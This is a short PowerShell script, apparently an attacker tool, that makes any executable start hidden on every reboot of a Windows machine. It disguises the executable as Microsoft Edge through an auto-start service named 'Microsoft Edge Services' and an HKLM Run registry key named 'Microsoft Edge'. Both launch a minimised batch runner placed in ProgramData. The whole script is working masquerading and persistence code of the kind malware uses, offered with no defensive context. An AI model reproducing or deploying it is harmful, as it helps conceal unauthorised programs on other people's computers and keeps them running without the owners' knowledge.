# Define paths and names
$exePath = "C:\Path\To\YourApp.exe"
$serviceName = "Microsoft Edge Services"
$startupName = "Microsoft Edge"
$cmdWrapper = "$env:ProgramData\edge_hidden_runner.bat"

# Create a hidden-runner batch file
$cmdContent = "@echo off`nstart \"\" /min cmd /c `"$exePath`""
Set-Content -Path $cmdWrapper -Value $cmdContent -Encoding ASCII

# Create Windows Service using sc.exe
sc.exe create "$serviceName" binPath= "cmd.exe /c start /min $cmdWrapper" start= auto DisplayName= "$serviceName"

# Set the service to auto-start
Set-Service -Name "$serviceName" -StartupType Automatic

# Create Registry Key for Startup App
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "$startupName" -Value "cmd.exe /c start /min $cmdWrapper"

Write-Output "[+] Service and Startup created to launch the app hidden on reboot."
